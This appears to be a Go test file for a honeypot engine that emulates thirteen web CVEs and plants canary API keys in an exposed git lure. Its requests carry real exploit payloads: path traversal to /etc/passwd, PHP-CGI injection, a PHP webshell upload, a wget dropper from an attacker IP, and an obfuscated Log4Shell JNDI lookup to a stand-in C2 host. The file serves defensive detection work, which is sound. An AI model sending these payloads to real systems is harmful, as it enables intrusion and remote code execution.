package webcve

import (
	"bytes"
	"context"
	"crypto/md5"
	"encoding/hex"
	"io"
	"mime/multipart"
	"net"
	"net/http"
	"strings"
	"sync"
	"testing"

	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing/object"

	"github.com/harris/honeypot/internal/canary"
	"github.com/harris/honeypot/internal/orchestrator"
	honeypotv1 "github.com/harris/honeypot/proto/gen/honeypot/v1"
)

func toUTF16LE(s string) []byte {
	out := make([]byte, 0, len(s)*2)
	for i := 0; i < len(s); i++ {
		out = append(out, s[i], 0x00)
	}
	return out
}

func TestWebCVEEngineAll13PacksAndGitClone(t *testing.T) {
	pool := canary.NewSensorKeyPool()
	pool.AddSeeds([]*honeypotv1.CanaryKeySeed{
		{
			CanaryKeyId:     "canary-web-1",
			KeyPlaintext:    "sk-proj-webcanarytest0000000000000000",
			ProviderStyle:   "openai",
			PlacementSource: "git_lure",
		},
		{
			CanaryKeyId:     "canary-ant-1",
			KeyPlaintext:    "sk-ant-api03-webcanary00-0000000000000000-000000000000",
			ProviderStyle:   "anthropic",
			PlacementSource: "git_lure",
		},
	})

	sink, err := orchestrator.NewStagedArtifactSink(t.TempDir(), nil)
	if err != nil {
		t.Fatal(err)
	}

	var mu sync.Mutex
	var events []*honeypotv1.TelemetryEvent
	var extractedURLs []string
	eng, err := NewEngine("node-web-1", "https://ai-gw.local", pool, sink, func(ev *honeypotv1.TelemetryEvent, urls []string) {
		mu.Lock()
		defer mu.Unlock()
		events = append(events, ev)
		extractedURLs = append(extractedURLs, urls...)
	})
	if err != nil {
		t.Fatal(err)
	}
	if len(eng.ListPacks()) != 13 {
		t.Fatalf("expected all 13 YAML packs loaded, got %d", len(eng.ListPacks()))
	}

	gitLure, err := NewGitLure(t.TempDir(), "https://ai-gw.local", "sk-proj-webcanarytest0000000000000000", "sk-ant-api03-webcanary00-0000000000000000-000000000000", "canary-web-1")
	if err != nil {
		t.Fatal(err)
	}
	mux := NewMux(eng, gitLure, nil, nil)

	// Bind raw TCP listener on 127.0.0.1:0 so raw %ad and .%2e URIs are transmitted untouched on wire
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	srv := &http.Server{Handler: mux}
	go func() { _ = srv.Serve(ln) }()
	defer func() { _ = srv.Close() }()
	baseURL := "http://" + ln.Addr().String()

	// Helper sending raw HTTP path bypassing client auto-cleaning
	sendRaw := func(method, rawPath string, headers map[string]string, body []byte) (int, http.Header, string) {
		req, _ := http.NewRequest(method, baseURL+"/", bytes.NewReader(body))
		req.URL.Opaque = rawPath
		for k, v := range headers {
			req.Header.Set(k, v)
		}
		client := &http.Client{
			CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse },
		}
		resp, err := client.Do(req)
		if err != nil {
			t.Fatalf("%s %s error: %v", method, rawPath, err)
		}
		b, _ := io.ReadAll(resp.Body)
		_ = resp.Body.Close()
		return resp.StatusCode, resp.Header, string(b)
	}

	// 1. CVE-2025-29927: without header redirects 307; with x-middleware-subrequest leaks Canary Key
	st, _, _ := sendRaw("GET", "/admin", nil, nil)
	if st != http.StatusTemporaryRedirect {
		t.Fatalf("expected 307 redirect without bypass header, got %d", st)
	}
	st, _, body := sendRaw("GET", "/admin", map[string]string{"X-Middleware-Subrequest": "src/middleware:src/middleware"}, nil)
	if st != 200 || !strings.Contains(body, "sk-proj-webcanarytest") {
		t.Fatalf("CVE-2025-29927 failed: status=%d body=%s", st, body)
	}

	// 2. CVE-2025-55182 UTF-16LE React2Shell WAF bypass
	utf16Payload := toUTF16LE(`0:["$@1",{"_response":{"_prefix":"process.mainModule.require('child_process').execSync('id');"}}]`)
	st, hdr, body := sendRaw("POST", "/dashboard", map[string]string{"Next-Action": "abc", "Content-Type": "text/x-component"}, utf16Payload)
	if st != 200 || !strings.Contains(hdr.Get("Content-Type"), "text/x-component") || !strings.Contains(body, "www-data") {
		t.Fatalf("React2Shell UTF-16LE failed: st=%d body=%s", st, body)
	}

	// 3. CVE-2024-34351 Next.js SSRF (no dial-out)
	st, _, _ = sendRaw("POST", "/", map[string]string{"Next-Action": "act1", "X-Forwarded-Host": "evil.oast.me"}, []byte("{}"))
	if st != http.StatusSeeOther {
		t.Fatalf("Next.js SSRF failed: st=%d", st)
	}

	// 4. CVE-2025-31125 Vite @fs read
	st, _, body = sendRaw("GET", "/@fs/etc/passwd?raw??", nil, nil)
	if st != 200 || !strings.Contains(body, "root:x:0:0") {
		t.Fatalf("Vite @fs read failed: st=%d body=%s", st, body)
	}

	// 5. CVE-2026-111497 Node2Shell Brotli probe quarantine
	st, _, body = sendRaw("POST", "/api/upload", map[string]string{"Content-Encoding": "br"}, []byte("corrupt-brotli-frame-https://c2.example/n2s.bin"))
	if st != 500 || !strings.Contains(body, "ERR_BROTLI_INVALID_PARAM") {
		t.Fatalf("Node2Shell failed: st=%d body=%s", st, body)
	}

	// 6. CVE-2024-4577 PHP-CGI %AD argument injection with exact md5 echo verification
	wantMD5 := md5.Sum([]byte("kev-check-4577"))
	wantHex := hex.EncodeToString(wantMD5[:])
	st, _, body = sendRaw("POST", "/cgi-bin/php-cgi.exe?%add+allow_url_include%3d1+%add+auto_prepend_file%3dphp://input", nil, []byte(`<?php echo md5("kev-check-4577"); ?>`))
	if st != 200 || !strings.Contains(body, wantHex) {
		t.Fatalf("CVE-2024-4577 md5 mismatch: st=%d want=%s got=%q", st, wantHex, body)
	}

	// 7. CVE-2026-109618 php2shell
	st, _, _ = sendRaw("POST", "/index.php", nil, []byte(`boundary=evil;<?php system("wget http://203.0.113.4/bot.elf"); ?>`))
	if st != 200 {
		t.Fatalf("php2shell failed: st=%d", st)
	}

	// 8. CVE-2021-3129 Laravel Ignition
	st, _, _ = sendRaw("POST", "/_ignition/execute-solution", nil, []byte(`{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"viewFile":"phar:///tmp/x"}}`))
	if st != 200 {
		t.Fatalf("Laravel Ignition failed: st=%d", st)
	}

	// 9. CVE-2017-9841 PHPUnit
	st, _, body = sendRaw("POST", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", nil, []byte(`<?php system("whoami"); ?>`))
	if st != 200 || !strings.Contains(body, "www-data") {
		t.Fatalf("PHPUnit failed: st=%d body=%q", st, body)
	}

	// 10. CVE-2021-41773 Apache path traversal
	st, _, body = sendRaw("GET", "/cgi-bin/.%2e/.%2e/.%2e/etc/passwd", nil, nil)
	if st != 200 || !strings.Contains(body, "root:x:0:0") {
		t.Fatalf("Apache traversal failed: st=%d body=%q", st, body)
	}

	// 11. CVE-2020-25213 WP File Manager multipart upload quarantine
	var mpBuf bytes.Buffer
	mw := multipart.NewWriter(&mpBuf)
	fw, _ := mw.CreateFormFile("upload[]", "evil_shell.php")
	_, _ = fw.Write([]byte(`<?php system($_GET['c']); ?>`))
	_ = mw.Close()
	st, _, body = sendRaw("POST", "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", map[string]string{"Content-Type": mw.FormDataContentType()}, mpBuf.Bytes())
	if st != 200 || !strings.Contains(body, "evil_shell.php") {
		t.Fatalf("WP File Manager failed: st=%d body=%s", st, body)
	}

	// 12. CVE-2022-22947 Spring Actuator
	st, _, body = sendRaw("GET", "/actuator/env", nil, nil)
	if st != 200 || !strings.Contains(body, "spring.ai.openai.api-key") {
		t.Fatalf("Spring Actuator failed: st=%d body=%s", st, body)
	}

	// 13. CVE-2021-44228 Nested Log4Shell obfuscation in header
	sendRaw("GET", "/login", map[string]string{
		"X-Api-Version": "${${lower:j}${::-n}${env:NOPE:-d}i:ldap://c2.attacker.test:1389/Exploit}",
	}, nil)

	// TogglePack test: disable CVE-2024-4577 -> no longer executes PHP-CGI eval
	if !eng.TogglePack("CVE-2024-4577", false) {
		t.Fatal("TogglePack failed")
	}
	st, _, body = sendRaw("POST", "/cgi-bin/php-cgi.exe?%add+auto_prepend_file%3dphp://input", nil, []byte(`<?php echo md5("kev-check-4577"); ?>`))
	if strings.Contains(body, wantHex) {
		t.Fatalf("expected CVE-2024-4577 disabled, got %s", body)
	}

	// Verify real go-git clone recovers the "deleted" Canary Key commit from /.git
	cloneDir := t.TempDir()
	cloned, err := git.PlainCloneContext(context.Background(), cloneDir, false, &git.CloneOptions{
		URL: baseURL + "/.git",
	})
	if err != nil {
		t.Fatalf("go-git PlainClone from /.git failed: %v", err)
	}
	cIter, err := cloned.Log(&git.LogOptions{})
	if err != nil {
		t.Fatal(err)
	}
	var foundCanaryInHistory bool
	_ = cIter.ForEach(func(c *object.Commit) error {
		fIter, _ := c.Files()
		_ = fIter.ForEach(func(f *object.File) error {
			if f.Name == ".env.production" {
				txt, _ := f.Contents()
				if strings.Contains(txt, "sk-proj-webcanarytest0000000000000000") {
					foundCanaryInHistory = true
				}
			}
			return nil
		})
		return nil
	})
	if !foundCanaryInHistory {
		t.Fatal("expected deleted .env.production Canary commit recoverable in cloned git history")
	}

	mu.Lock()
	defer mu.Unlock()
	var sawLog4j bool
	for _, ev := range events {
		if ev.GetCveId() == "CVE-2021-44228" && strings.Contains(ev.GetExtractedIocsJson(), "jndi:ldap://c2.attacker.test:1389/Exploit") {
			sawLog4j = true
		}
	}
	if !sawLog4j {
		t.Fatalf("expected de-obfuscated Log4Shell IOC recorded in events")
	}
	if len(extractedURLs) == 0 {
		t.Fatal("expected extracted attacker dropper URLs")
	}
}
